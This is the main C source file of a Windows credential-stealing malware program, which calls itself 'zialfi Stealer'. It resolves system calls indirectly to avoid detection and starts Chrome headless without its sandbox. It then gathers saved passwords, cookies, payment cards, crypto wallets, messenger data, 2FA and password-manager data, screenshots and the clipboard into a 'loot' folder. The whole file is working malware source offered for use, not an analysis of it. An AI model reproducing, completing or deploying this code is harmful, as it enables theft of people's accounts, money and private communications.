#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <shlobj.h>
#include "config.h"
#include "engine.h"
#include "peb.h"
#include "hash.h"
#include "chromium.h"
#include "firefox.h"
#include "wallets.h"
#include "messengers.h"

#ifdef ENABLE_SYSTEM_INFO
extern int mirage_collect_system_info(char *output, size_t outlen);
#endif
#ifdef ENABLE_KEYLOGGER
#include "keylogger.h"
#endif
#ifdef ENABLE_SCREENSHOT
#include "screenshot.h"
#endif
#ifdef ENABLE_CLIPBOARD
#include "clipboard.h"
#endif
#ifdef ENABLE_FILE_GRABBER
#include "grabber.h"
#endif
#ifdef ENABLE_SEED_PHRASE_GRABBER
#include "seed_grabber.h"
#endif
#ifdef ENABLE_CLIPPER
#include "clipper.h"
#endif
#ifdef ENABLE_GAMING_STEAM
#include "gaming.h"
#endif
#ifdef ENABLE_VPN_NORDVPN
#include "vpn.h"
#endif
#ifdef ENABLE_2FA_GOOGLE
#include "twofa.h"
#endif
#ifdef ENABLE_PM_BITWARDEN
#include "passman.h"
#endif

static void get_appdata_local(char *buf, size_t len) {
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, buf) != S_OK)
        snprintf(buf, len, "C:\\Users\\%s\\AppData\\Local", getenv("USERNAME") ? getenv("USERNAME") : "user");
}

static void get_appdata_roaming(char *buf, size_t len) {
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, buf) != S_OK)
        snprintf(buf, len, "C:\\Users\\%s\\AppData\\Roaming", getenv("USERNAME") ? getenv("USERNAME") : "user");
}

static void get_desktop(char *buf, size_t len) {
    if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, buf) != S_OK)
        snprintf(buf, len, "C:\\Users\\%s\\Desktop", getenv("USERNAME") ? getenv("USERNAME") : "user");
}

static void write_string_array(const char *path, char **items, size_t count) {
    FILE *f = fopen(path, "a");
    if (!f) return;
    for (size_t i = 0; i < count; i++) {
        if (items[i])
            fprintf(f, "%s\n", items[i]);
    }
    fclose(f);
}

static void save_browser_data(const char *output_dir, const char *prefix, CollectResult *result) {
    for (size_t i = 0; i < result->count; i++) {
        BrowserData *b = &result->data[i];
        char path[MAX_PATH];

        if (b->logins && b->login_count > 0) {
            snprintf(path, sizeof(path), "%s\\%s_%s_logins.txt",
                     output_dir, prefix, b->browser_name ? b->browser_name : "unknown");
            write_string_array(path, b->logins, b->login_count);
            printf("[+] %s logins: %zu -> %s\n", prefix, b->login_count, path);
        }

        if (b->cookies && b->cookie_count > 0) {
            snprintf(path, sizeof(path), "%s\\%s_%s_cookies.txt",
                     output_dir, prefix, b->browser_name ? b->browser_name : "unknown");
            write_string_array(path, b->cookies, b->cookie_count);
            printf("[+] %s cookies: %zu -> %s\n", prefix, b->cookie_count, path);
        }

        if (b->history && b->history_count > 0) {
            snprintf(path, sizeof(path), "%s\\%s_%s_history.txt",
                     output_dir, prefix, b->browser_name ? b->browser_name : "unknown");
            write_string_array(path, b->history, b->history_count);
            printf("[+] %s history: %zu -> %s\n", prefix, b->history_count, path);
        }

        if (b->cards && b->card_count > 0) {
            snprintf(path, sizeof(path), "%s\\%s_%s_cards.txt",
                     output_dir, prefix, b->browser_name ? b->browser_name : "unknown");
            write_string_array(path, b->cards, b->card_count);
            printf("[+] %s cards: %zu -> %s\n", prefix, b->card_count, path);
        }

        if (b->autofill && b->autofill_count > 0) {
            snprintf(path, sizeof(path), "%s\\%s_%s_autofill.txt",
                     output_dir, prefix, b->browser_name ? b->browser_name : "unknown");
            write_string_array(path, b->autofill, b->autofill_count);
            printf("[+] %s autofill: %zu -> %s\n", prefix, b->autofill_count, path);
        }

        if (b->bookmarks && b->bookmark_count > 0) {
            snprintf(path, sizeof(path), "%s\\%s_%s_bookmarks.txt",
                     output_dir, prefix, b->browser_name ? b->browser_name : "unknown");
            write_string_array(path, b->bookmarks, b->bookmark_count);
            printf("[+] %s bookmarks: %zu -> %s\n", prefix, b->bookmark_count, path);
        }
    }
}

static void save_messenger_files(const char *output_dir, const char *subdir, MessengerResult *m) {
    if (!m->files || m->count == 0) return;

    char dest_dir[MAX_PATH];
    snprintf(dest_dir, sizeof(dest_dir), "%s\\%s", output_dir, subdir);
    CreateDirectoryA(dest_dir, NULL);

    for (size_t i = 0; i < m->count; i++) {
        if (!m->files[i]) continue;
        const char *fname = strrchr(m->files[i], '\\');
        if (!fname) fname = strrchr(m->files[i], '/');
        if (!fname) continue;
        fname++;

        char dest[MAX_PATH];
        snprintf(dest, sizeof(dest), "%s\\%s", dest_dir, fname);
        CopyFileA(m->files[i], dest, FALSE);
        printf("[+] Copied %s -> %s\n", m->files[i], dest);
    }
}

static void save_text_to_file(const char *path, const char *text) {
    FILE *f = fopen(path, "w");
    if (!f) return;
    fprintf(f, "%s", text);
    fclose(f);
    printf("[+] Saved %s\n", path);
}

int main(int argc, char *argv[]) {
    (void)argc; (void)argv;

    printf("[*] zialfi Stealer (C11) starting...\n");
    fflush(stdout);

    char local[MAX_PATH], roaming[MAX_PATH], desktop[MAX_PATH], output_dir[MAX_PATH];
    get_appdata_local(local, sizeof(local));
    get_appdata_roaming(roaming, sizeof(roaming));
    get_desktop(desktop, sizeof(desktop));
    snprintf(output_dir, sizeof(output_dir), "C:\\Users\\%s\\Desktop\\zialfi_loot",
             getenv("USERNAME") ? getenv("USERNAME") : "artur");
    CreateDirectoryA(output_dir, NULL);

    printf("[+] Local:  %s\n", local);
    printf("[+] Roaming: %s\n", roaming);
    printf("[+] Output: %s\n", output_dir);
    fflush(stdout);

    int ok = mirage_syscall_resolve();
    if (ok) {
        printf("[+] Syscalls resolved (indirect)\n");
        mirage_init_gadget_pool();
        printf("[+] Gadget pool filled\n");
    } else {
        printf("[!] PEB walk failed — using fallback WinAPI\n");
    }
    fflush(stdout);

#ifdef ENABLE_CHROMIUM_STEALER
    /* Launch Chrome headless with ORIGINAL user data dir to activate COM IElevator */
    printf("[*] Ensuring browser COM server is active...\n"); fflush(stdout);
    STARTUPINFOA si_chrome = { sizeof(si_chrome) };
    PROCESS_INFORMATION pi_chrome = {0};
    char chrome_cmd[MAX_PATH];
    snprintf(chrome_cmd, sizeof(chrome_cmd),
             "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --no-sandbox --disable-gpu");
    if (CreateProcessA(NULL, chrome_cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si_chrome, &pi_chrome)) {
        Sleep(8000); /* Wait longer for COM server */
        printf("[+] Chrome started (PID %lu)\n", pi_chrome.dwProcessId);
    } else {
        printf("[!] Chrome start failed\n");
    }

    printf("[*] Chromium...\n"); fflush(stdout);
    CollectResult chrome = collect_chromium(local, roaming);
    printf("[+] Chromium: %zu browsers\n", chrome.count);
    save_browser_data(output_dir, "chromium", &chrome);
    free_browser_data(&chrome);
#endif

#ifdef ENABLE_FIREFOX_STEALER
    printf("[*] Firefox...\n"); fflush(stdout);
    CollectResult ff = collect_firefox(roaming);
    printf("[+] Firefox: %zu browsers\n", ff.count);
    save_browser_data(output_dir, "firefox", &ff);
    free_firefox_data(&ff);
#endif

#ifdef ENABLE_WALLET_EXTENSIONS
    printf("[*] Wallets...\n"); fflush(stdout);
    CollectResult wallets = collect_wallets(local, roaming);
    printf("[+] Wallets: %zu\n", wallets.count);
    save_browser_data(output_dir, "wallets", &wallets);
    free_browser_data(&wallets);
#endif

    printf("[*] Messengers...\n"); fflush(stdout);
    MessengerData messengers = collect_messengers(roaming, local);
    printf("[+] Discord: %zu, Telegram: %zu, Signal: %zu\n",
           messengers.discord.count, messengers.telegram.count, messengers.signal.count);
    save_messenger_files(output_dir, "discord", &messengers.discord);
    save_messenger_files(output_dir, "telegram", &messengers.telegram);
    save_messenger_files(output_dir, "signal", &messengers.signal);
    save_messenger_files(output_dir, "whatsapp", &messengers.whatsapp);
    save_messenger_files(output_dir, "skype", &messengers.skype);
    save_messenger_files(output_dir, "viber", &messengers.viber);
    save_messenger_files(output_dir, "element", &messengers.element);
    save_messenger_files(output_dir, "session", &messengers.session);
    save_messenger_files(output_dir, "tox", &messengers.tox);
    save_messenger_files(output_dir, "icq", &messengers.icq);
    save_messenger_files(output_dir, "pidgin", &messengers.pidgin);
    save_messenger_files(output_dir, "outlook", &messengers.outlook);
    save_messenger_files(output_dir, "jabber", &messengers.jabber);
    save_messenger_files(output_dir, "microsip", &messengers.microsip);
    free_messenger_data(&messengers);

#ifdef ENABLE_SYSTEM_INFO
    printf("[*] System info...\n"); fflush(stdout);
    char sys_info[4096] = {0};
    mirage_collect_system_info(sys_info, sizeof(sys_info));
    {
        char si_path[MAX_PATH];
        snprintf(si_path, sizeof(si_path), "%s\\system_info.txt", output_dir);
        save_text_to_file(si_path, sys_info);
    }
    printf("[+] System info OK\n");
#endif

#ifdef ENABLE_SCREENSHOT
    char ss_path[MAX_PATH];
    snprintf(ss_path, sizeof(ss_path), "%s\\screenshot.bmp", output_dir);
    printf("[*] Screenshot...\n"); fflush(stdout);
    if (screenshot_capture(ss_path) == 0)
        printf("[+] Screenshot: %s\n", ss_path);
    else
        printf("[!] Screenshot failed\n");
#endif

#ifdef ENABLE_CLIPBOARD
    char clip_buf[4096] = {0};
    printf("[*] Clipboard...\n"); fflush(stdout);
    int clip_len = clipboard_get_text(clip_buf, sizeof(clip_buf));
    if (clip_len > 0) {
        char clip_path[MAX_PATH];
        snprintf(clip_path, sizeof(clip_path), "%s\\clipboard.txt", output_dir);
        save_text_to_file(clip_path, clip_buf);
    }
    printf("[+] Clipboard: %d bytes\n", clip_len);
#endif

#ifdef ENABLE_KEYLOGGER
    printf("[+] Keylogger: available (run interactively)\n");
#endif

#ifdef ENABLE_FILE_GRABBER
    printf("[*] File grabber...\n"); fflush(stdout);
    int grabbed = grabber_collect(output_dir, 100);
    printf("[+] Grabbed %d files\n", grabbed);
#endif

#ifdef ENABLE_GAMING_STEAM
    printf("[*] Gaming...\n"); fflush(stdout);
    gaming_collect_all(output_dir);
#endif

#ifdef ENABLE_VPN_NORDVPN
    printf("[*] VPN...\n"); fflush(stdout);
    int vpn_files = vpn_collect(output_dir);
    printf("[+] VPN: %d files\n", vpn_files);
#endif

#ifdef ENABLE_2FA_GOOGLE
    printf("[*] 2FA...\n"); fflush(stdout);
    twofa_collect(output_dir);
#endif

#ifdef ENABLE_PM_BITWARDEN
    printf("[*] Password managers...\n"); fflush(stdout);
    passman_collect(output_dir);
#endif

    printf("[*] Done. Output: %s\n", output_dir);
    fflush(stdout);
    return 0;
}
